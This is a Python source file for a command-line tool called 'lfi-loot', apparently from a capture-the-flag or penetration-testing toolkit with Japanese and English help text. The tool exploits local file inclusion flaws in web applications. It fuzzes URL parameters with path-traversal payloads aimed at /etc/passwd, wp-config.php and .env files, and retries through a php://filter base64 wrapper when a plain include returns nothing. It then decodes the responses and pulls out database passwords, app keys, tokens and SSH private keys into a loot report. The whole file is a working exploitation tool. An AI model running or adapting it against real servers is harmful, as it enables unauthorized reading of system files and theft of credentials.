#!/usr/bin/env python3
"""Offline LFI response parser for local files and fetched URLs."""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import re
import shutil
import ssl
import sys
from dataclasses import dataclass
from html import unescape
from pathlib import Path
from typing import Iterable
from urllib.error import HTTPError
from urllib.error import URLError
from urllib.parse import parse_qs
from urllib.parse import parse_qsl
from urllib.parse import quote
from urllib.parse import unquote
from urllib.parse import urlencode
from urllib.parse import urlparse
from urllib.parse import urlunparse
from urllib.request import Request
from urllib.request import urlopen

from toolkit_i18n import is_ja


BASE64_RE = re.compile(r"(?<![A-Za-z0-9+/=])([A-Za-z0-9+/]{20,}={0,2})(?![A-Za-z0-9+/=])")
TAG_RE = re.compile(r"(?is)<(pre|textarea)[^>]*>(.*?)</\1>")
WORDPRESS_SECRET_RE = re.compile(
    r"define\(\s*['\"](?P<key>DB_NAME|DB_USER|DB_PASSWORD|DB_HOST)['\"]\s*,\s*['\"](?P<value>.*?)['\"]\s*\)",
    re.IGNORECASE,
)
ENV_SECRET_RE = re.compile(
    r"^(?P<key>APP_KEY|DB_HOST|DB_DATABASE|DB_USERNAME|DB_PASSWORD)\s*=\s*(?P<value>.+?)\s*$",
    re.MULTILINE,
)
GENERIC_SECRET_RE = re.compile(
    r"(?im)\b(?P<key>password|passwd|secret|token|apikey|api_key|user|username)\b"
    r"[^A-Za-z0-9]{0,8}"
    r"(?:=>|=|:)\s*['\"]?(?P<value>[^'\"\r\n;#]+)"
)
SUCCESS_MARKERS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("linux-passwd", re.compile(r"root:x:0:0:")),
    ("php", re.compile(r"<\?php")),
    ("wordpress", re.compile(r"define\(\s*['\"]DB_(?:NAME|USER|PASSWORD)['\"]", re.IGNORECASE)),
    ("laravel", re.compile(r"^(?:APP_KEY|DB_HOST|DB_DATABASE)=", re.MULTILINE)),
    ("ssh-key", re.compile(r"BEGIN (?:RSA|OPENSSH) PRIVATE KEY")),
)
LFI_QUERY_KEYS = (
    "file",
    "page",
    "include",
    "path",
    "doc",
    "document",
    "folder",
    "dir",
    "template",
    "view",
    "load",
    "f",
    "p",
    "pl",
    "name",
)
DEFAULT_FETCH_TIMEOUT = 30
PHP_BASE64_FILTER = "php://filter/convert.base64-encode/resource="
FUZZ_MARKER = "FUZZ"
DEFAULT_FUZZ_PAYLOADS: tuple[str, ...] = (
    "/etc/passwd",
    "wp-config.php",
    "../wp-config.php",
    "../../wp-config.php",
    "../../../wp-config.php",
    "../../../../wp-config.php",
    "../../../../../wp-config.php",
    ".env",
    "../.env",
    "../../.env",
    "../../../.env",
    "config.php",
    "database.php",
    "db.php",
    "settings.php",
)
LFI_QUERY_KEYS_LOWER = frozenset(k.lower() for k in LFI_QUERY_KEYS)


class LfiLootError(Exception):
    pass


@dataclass
class SourceItem:
    source_path: Path
    logical_name: str


@dataclass
class Candidate:
    text: str
    kind: str


@dataclass
class SuccessResult:
    source_path: Path
    logical_name: str
    saved_name: str
    markers: list[str]
    decoded: bool
    secret_count: int


def case_home() -> Path:
    raw = (os.environ.get("CASE_HOME") or "").strip()
    if not raw:
        raise LfiLootError("CASE_HOME not set — case-set <room> first")
    return Path(raw)


def output_root() -> Path:
    return case_home() / "exploits" / "lfi-loot"


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="lfi-loot",
        description=(
            "ローカルファイル、ディレクトリ、HTTP(S) URL を解析して LFI 由来の取得物を抽出します。"
            if is_ja()
            else "Parse local files, directories, or HTTP(S) URLs and extract likely LFI loot."
        ),
    )
    parser.add_argument(
        "--name",
        action="append",
        default=[],
        metavar="LOGICAL=TARGET",
        help=(
            "論理ファイル名を上書きします（TARGET にはローカルパスか URL を指定可能）。"
            if is_ja()
            else "Override logical filename (TARGET may be a local path or URL)."
        ),
    )
    parser.add_argument(
        "-k",
        "--insecure",
        action="store_true",
        help=(
            "https:// URL の TLS 証明書検証をスキップします。"
            if is_ja()
            else "Skip TLS certificate verification for https:// URLs."
        ),
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_FETCH_TIMEOUT,
        metavar="SEC",
        help=(
            f"URL 用の HTTP タイムアウト（既定: {DEFAULT_FETCH_TIMEOUT}）。"
            if is_ja()
            else f"HTTP timeout for URLs (default: {DEFAULT_FETCH_TIMEOUT})."
        ),
    )
    parser.add_argument(
        "-u",
        "--url",
        action="append",
        default=[],
        metavar="URL",
        help=(
            "取得する HTTP(S) URL（複数指定可）。zsh では bare URL よりこちらを推奨。"
            if is_ja()
            else "HTTP(S) URL to fetch (repeatable). Prefer this over a bare URL in zsh."
        ),
    )
    parser.add_argument(
        "--fuzz-payload",
        action="append",
        default=[],
        metavar="PATH",
        help=(
            f"URL に {FUZZ_MARKER} を含むときの追加 include パス（複数指定可）。"
            if is_ja()
            else f"Extra include path when URL contains {FUZZ_MARKER} (repeatable)."
        ),
    )
    parser.add_argument(
        "--no-b64-fallback",
        action="store_true",
        help=(
            "direct include が空のときに php://filter base64 で自動再試行しません。"
            if is_ja()
            else "Do not auto-retry with php://filter base64 when direct include returns empty."
        ),
    )
    parser.add_argument(
        "inputs",
        nargs="*",
        help=(
            "解析対象のローカルファイル/ディレクトリ、または http(s):// URL。"
            if is_ja()
            else "Local files/directories and/or http(s):// URLs to scan."
        ),
    )
    return parser.parse_args(argv)


def looks_like_url(raw: str) -> bool:
    lowered = raw.strip().lower()
    return lowered.startswith("http://") or lowered.startswith("https://")


def expand_fuzz_inputs(inputs: list[str], extra_payloads: list[str] | None = None) -> list[str]:
    payloads = list(DEFAULT_FUZZ_PAYLOADS)
    if extra_payloads:
        payloads.extend(extra_payloads)
    expanded: list[str] = []
    for raw in inputs:
        text = raw.strip()
        if looks_like_url(text) and FUZZ_MARKER in text:
            urls = [text.replace(FUZZ_MARKER, quote(payload, safe="/")) for payload in payloads]
            print(f"[*] fuzz: {len(urls)} payloads ({FUZZ_MARKER} template)", file=sys.stderr)
            expanded.extend(urls)
            continue
        expanded.append(raw)
    return expanded


def normalize_lfi_param(value: str) -> str:
    candidate = unquote(value).strip()
    if not candidate:
        return candidate
    resource = re.search(r"(?i)resource=(.+)$", candidate)
    if resource:
        return unquote(resource.group(1)).strip()
    if candidate.lower().startswith("php://"):
        tail = candidate.rsplit("/", 1)[-1]
        if tail and "." in tail:
            return tail
    return candidate


def infer_logical_name_from_url(url: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=False)
    for key in LFI_QUERY_KEYS:
        for candidate_key in (key, key.upper(), key.capitalize()):
            values = qs.get(candidate_key)
            if not values:
                continue
            candidate = normalize_lfi_param(values[0])
            if candidate:
                return candidate
    tail = unquote(parsed.path.rstrip("/")).split("/")[-1]
    return tail or "response.html"


def is_php_filter_param(value: str) -> bool:
    return unquote(value).strip().lower().startswith("php://")


def build_base64_filter_url(url: str) -> str | None:
    parsed = urlparse(url)
    if not parsed.query:
        return None
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    new_pairs: list[tuple[str, str]] = []
    upgraded = False
    for key, value in pairs:
        if key.lower() in LFI_QUERY_KEYS_LOWER and not upgraded:
            if is_php_filter_param(value):
                return None
            path = normalize_lfi_param(value)
            if not path:
                continue
            new_pairs.append((key, f"{PHP_BASE64_FILTER}{path}"))
            upgraded = True
            continue
        new_pairs.append((key, value))
    if not upgraded:
        return None
    query = urlencode(new_pairs, safe=":/=")
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))


def response_needs_base64_fallback(path: Path) -> bool:
    if path.stat().st_size == 0:
        return True
    text = read_text_lossy(path).strip()
    if not text:
        return True
    candidate, _markers, _secrets = choose_best_candidate(extract_candidates(text))
    return candidate is None


def _ssl_context(insecure: bool) -> ssl.SSLContext | None:
    if not insecure:
        return None
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def fetch_url_body(url: str, *, insecure: bool = False, timeout: int = DEFAULT_FETCH_TIMEOUT) -> bytes:
    req = Request(url, headers={"User-Agent": "lfi-loot/1.0"})
    ctx = _ssl_context(insecure)
    try:
        with urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.read()
    except HTTPError as exc:
        return exc.read()
    except URLError as exc:
        raise LfiLootError(f"fetch failed: {url} ({exc})") from exc


def url_fetch_filename(url: str) -> str:
    digest = hashlib.sha256(url.encode("utf-8")).hexdigest()[:12]
    host = urlparse(url).hostname or "host"
    host_slug = re.sub(r"[^A-Za-z0-9._-]", "_", host)
    return f"{host_slug}_{digest}.html"


def fetch_url_to_file(
    url: str,
    dest_dir: Path,
    *,
    insecure: bool = False,
    timeout: int = DEFAULT_FETCH_TIMEOUT,
) -> Path:
    body = fetch_url_body(url, insecure=insecure, timeout=timeout)
    if not body.strip():
        print(f"[!] warning: empty response from {url}", file=sys.stderr)
    fetched_dir = dest_dir / "fetched"
    fetched_dir.mkdir(parents=True, exist_ok=True)
    path = fetched_dir / url_fetch_filename(url)
    path.write_bytes(body)
    return path


def parse_name_overrides(values: list[str]) -> dict[str, str]:
    overrides: dict[str, str] = {}
    for raw in values:
        logical, sep, target = raw.partition("=")
        if not sep or not logical.strip() or not target.strip():
            raise LfiLootError(f"invalid --name entry: {raw!r}")
        key = target.strip()
        if looks_like_url(key):
            overrides[key] = logical.strip()
        else:
            overrides[str(Path(key).expanduser().resolve())] = logical.strip()
    return overrides


def collect_sources(
    inputs: list[str],
    overrides: dict[str, str],
    *,
    insecure: bool = False,
    timeout: int = DEFAULT_FETCH_TIMEOUT,
    fetch_dir: Path | None = None,
    auto_b64_fallback: bool = True,
) -> list[SourceItem]:
    items: list[SourceItem] = []
    seen: set[Path] = set()
    for raw in inputs:
        if looks_like_url(raw):
            url = raw.strip()
            logical = overrides.get(url) or infer_logical_name_from_url(url)
            if fetch_dir is None:
                raise LfiLootError("internal error: fetch_dir required for URL inputs")
            path = fetch_url_to_file(url, fetch_dir, insecure=insecure, timeout=timeout)
            print(f"[*] fetch: {url} -> {path} ({path.stat().st_size} bytes)")
            if auto_b64_fallback:
                b64_url = build_base64_filter_url(url)
                if b64_url and response_needs_base64_fallback(path):
                    print(
                        "[!] direct include returned no loot — retrying via php://filter base64",
                        file=sys.stderr,
                    )
                    path = fetch_url_to_file(b64_url, fetch_dir, insecure=insecure, timeout=timeout)
                    print(f"[*] fetch: {b64_url} -> {path} ({path.stat().st_size} bytes)")
            if path not in seen:
                items.append(SourceItem(path, logical))
                seen.add(path)
            continue
        path = Path(raw).expanduser().resolve()
        if not path.exists():
            raise LfiLootError(f"input not found: {raw}")
        if path.is_dir():
            for child in sorted(p for p in path.rglob("*") if p.is_file()):
                key = str(child)
                if child not in seen:
                    items.append(SourceItem(child, overrides.get(key, infer_logical_name(child))))
                    seen.add(child)
            continue
        key = str(path)
        if path not in seen:
            items.append(SourceItem(path, overrides.get(key, infer_logical_name(path))))
            seen.add(path)
    if not items:
        raise LfiLootError("no input files found")
    return items


def infer_logical_name(path: Path) -> str:
    stem = path.stem if path.suffix else path.name
    if stem.startswith("UP_UP_"):
        depth = len(re.findall(r"UP_UP_", stem))
        tail = stem[depth * len("UP_UP_") :]
        rebuilt = "../" * depth + tail.replace("__", "/")
        return rebuilt or path.name
    if "__" in stem:
        return "/" + stem.replace("__", "/")
    return path.name


def sanitize_logical_name(name: str) -> str:
    raw = name.strip().replace("\\", "/")
    prefix = ""
    while raw.startswith("../"):
        prefix += "UP_UP_"
        raw = raw[3:]
    for suffix in (".html", ".htm", ".raw", ".txt"):
        if raw.lower().endswith(suffix):
            raw = raw[: -len(suffix)]
            break
    raw = raw.lstrip("/")
    raw = raw.replace("/", "__")
    raw = re.sub(r"[^A-Za-z0-9._-]", "_", raw) or "unnamed"
    return prefix + raw


def raw_copy_name(path: Path, fallback: str) -> str:
    suffix = path.suffix if path.suffix else ".raw"
    return sanitize_logical_name(fallback) + suffix


def detect_output_suffix(logical_name: str, text: str) -> str:
    suffix = Path(logical_name).suffix.lower()
    if suffix and suffix not in {".html", ".htm", ".txt", ".raw"}:
        return suffix
    if re.search(r"<\?php", text):
        return ".php"
    if re.search(r"BEGIN (?:RSA|OPENSSH) PRIVATE KEY", text):
        return ".key"
    return ".txt"


def read_text_lossy(path: Path) -> str:
    data = path.read_bytes()
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        return data.decode("utf-8", errors="replace")


def extract_candidates(raw_text: str) -> list[Candidate]:
    candidates: list[Candidate] = [Candidate(raw_text, "raw")]
    stripped = raw_text.strip()
    if (
        stripped
        and len(stripped) >= 40
        and re.fullmatch(r"[A-Za-z0-9+/=\s]+", stripped)
    ):
        decoded = try_decode_base64(stripped)
        if decoded:
            candidates.append(Candidate(decoded, "base64-body"))
    for match in TAG_RE.finditer(raw_text):
        inner = unescape(match.group(2)).strip()
        if inner:
            candidates.append(Candidate(inner, match.group(1).lower()))
    flattened = unescape(re.sub(r"(?is)<[^>]+>", " ", raw_text)).strip()
    if flattened:
        candidates.append(Candidate(flattened, "html-text"))
    for token in find_base64_tokens(raw_text):
        decoded = try_decode_base64(token)
        if decoded:
            candidates.append(Candidate(decoded, "base64"))
    deduped: list[Candidate] = []
    seen: set[str] = set()
    for item in candidates:
        key = item.text.strip()
        if key and key not in seen:
            seen.add(key)
            deduped.append(item)
    return deduped


def find_base64_tokens(text: str) -> list[str]:
    tokens = [match.group(1) for match in BASE64_RE.finditer(text)]
    compact = re.sub(r"\s+", "", text)
    if len(compact) >= 80 and re.fullmatch(r"[A-Za-z0-9+/=]+", compact):
        tokens.append(compact)
    return tokens


def try_decode_base64(token: str) -> str | None:
    compact = re.sub(r"\s+", "", token)
    if len(compact) < 16:
        return None
    padded = compact + ("=" * ((4 - len(compact) % 4) % 4))
    try:
        data = base64.b64decode(padded, validate=True)
    except Exception:
        try:
            data = base64.b64decode(padded, validate=False)
        except Exception:
            return None
    if not data:
        return None
    text = data.decode("utf-8", errors="replace").strip()
    if not text:
        return None
    printable = sum(1 for ch in text if ch == "\n" or ch == "\r" or ch == "\t" or 32 <= ord(ch) <= 126)
    if printable / max(len(text), 1) < 0.85:
        return None
    return text


def detect_markers(text: str) -> list[str]:
    return [name for name, pattern in SUCCESS_MARKERS if pattern.search(text)]


def extract_secrets(text: str) -> list[tuple[str, str]]:
    secrets: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()
    for pattern in (WORDPRESS_SECRET_RE, ENV_SECRET_RE, GENERIC_SECRET_RE):
        for match in pattern.finditer(text):
            pair = (match.group("key"), match.group("value").strip().strip("'\""))
            if pair not in seen and pair[1]:
                seen.add(pair)
                secrets.append(pair)
    return secrets


def choose_best_candidate(candidates: Iterable[Candidate]) -> tuple[Candidate | None, list[str], list[tuple[str, str]]]:
    best: Candidate | None = None
    best_markers: list[str] = []
    best_secrets: list[tuple[str, str]] = []
    best_score = -1
    for candidate in candidates:
        markers = detect_markers(candidate.text)
        secrets = extract_secrets(candidate.text)
        score = len(markers) * 100 + len(secrets) * 10 + min(len(candidate.text), 5000) // 200
        if not markers and not secrets:
            continue
        if score > best_score:
            best = candidate
            best_markers = markers
            best_secrets = secrets
            best_score = score
    return best, best_markers, best_secrets


def ensure_output_dirs(root: Path) -> tuple[Path, Path]:
    files_dir = root / "files"
    raw_dir = root / "raw"
    files_dir.mkdir(parents=True, exist_ok=True)
    raw_dir.mkdir(parents=True, exist_ok=True)
    return files_dir, raw_dir


def write_outputs(
    results: list[tuple[SuccessResult, list[tuple[str, str]]]],
    source_count: int,
    out_dir: Path,
) -> None:
    files_dir, raw_dir = ensure_output_dirs(out_dir)
    all_secrets = [(item.saved_name, secret) for item, secrets in results for secret in secrets]

    for item, _secrets in results:
        target_raw = raw_dir / raw_copy_name(item.source_path, item.logical_name)
        shutil.copyfile(item.source_path, target_raw)

    secrets_path = out_dir / "secrets.txt"
    report_path = out_dir / "report.md"
    summary_path = out_dir / "summary.json"

    secret_lines: list[str] = []
    current_section = None
    for saved_name, (key, value) in all_secrets:
        if saved_name != current_section:
            if secret_lines:
                secret_lines.append("")
            secret_lines.append(f"[{saved_name}]")
            secret_lines.append("")
            current_section = saved_name
        secret_lines.append(f"{key}={value}")
    secrets_path.write_text("\n".join(secret_lines).strip() + ("\n" if secret_lines else ""), encoding="utf-8")

    summary = {
        "successful_files": len(results),
        "secrets_found": len(all_secrets),
        "tried_files": source_count,
        "successes": [
            {
                "logical_name": item.logical_name,
                "saved_name": item.saved_name,
                "source_path": str(item.source_path),
                "markers": item.markers,
                "decoded": item.decoded,
                "secret_count": item.secret_count,
            }
            for item, _secrets in results
        ],
    }
    summary_path.write_text(json.dumps(summary, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

    report_lines = [
        "# LFI Loot Report",
        "",
        "## Summary",
        "",
        f"- Tried files: {source_count}",
        f"- Successful files: {len(results)}",
        f"- Secrets found: {len(all_secrets)}",
        f"- Output dir: {out_dir}",
        "",
        "## Successful Files",
        "",
    ]
    if results:
        for item, _secrets in results:
            report_lines.append(
                f"- `{item.logical_name}` -> `files/{item.saved_name}`"
                f" ({', '.join(item.markers)})"
            )
    else:
        report_lines.append("- None")
    report_lines.extend(["", "## Secrets", ""])
    if all_secrets:
        for saved_name, (key, value) in all_secrets:
            report_lines.append(f"- `{saved_name}`: `{key}={value}`")
    else:
        report_lines.append("- None")
    report_path.write_text("\n".join(report_lines) + "\n", encoding="utf-8")


def run(argv: list[str] | None = None) -> int:
    args = parse_args(list(argv if argv is not None else sys.argv[1:]))
    inputs = expand_fuzz_inputs(list(args.inputs) + list(args.url), extra_payloads=args.fuzz_payload)
    if not inputs:
        print("[-] no inputs — pass files, directories, URLs, or --url", file=sys.stderr)
        return 1
    try:
        overrides = parse_name_overrides(args.name)
        out_dir = output_root()
        _files_dir, raw_dir = ensure_output_dirs(out_dir)
        sources = collect_sources(
            inputs,
            overrides,
            insecure=args.insecure,
            timeout=args.timeout,
            fetch_dir=raw_dir,
            auto_b64_fallback=not args.no_b64_fallback,
        )
        files_dir, _raw_dir = ensure_output_dirs(out_dir)
        results: list[tuple[SuccessResult, list[tuple[str, str]]]] = []
        for item in sources:
            raw_text = read_text_lossy(item.source_path)
            candidate, markers, secrets = choose_best_candidate(extract_candidates(raw_text))
            if candidate is None:
                continue
            saved_name = sanitize_logical_name(item.logical_name)
            ext = detect_output_suffix(item.logical_name, candidate.text)
            body_path = files_dir / f"{saved_name}{ext if not saved_name.endswith(ext) else ''}"
            body_path.write_text(candidate.text.rstrip() + "\n", encoding="utf-8")
            results.append(
                (
                    SuccessResult(
                        source_path=item.source_path,
                        logical_name=item.logical_name,
                        saved_name=body_path.name,
                        markers=markers,
                        decoded=(candidate.kind == "base64"),
                        secret_count=len(secrets),
                    ),
                    secrets,
                )
            )
        write_outputs(results, len(sources), out_dir)
        print(f"[+] wrote: {out_dir}")
        print(f"[+] successful files: {len(results)}")
        print(f"[+] secrets found: {sum(len(secrets) for _item, secrets in results)}")
        return 0
    except LfiLootError as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1


def main(argv: list[str] | None = None) -> int:
    return run(argv)


if __name__ == "__main__":
    raise SystemExit(main())
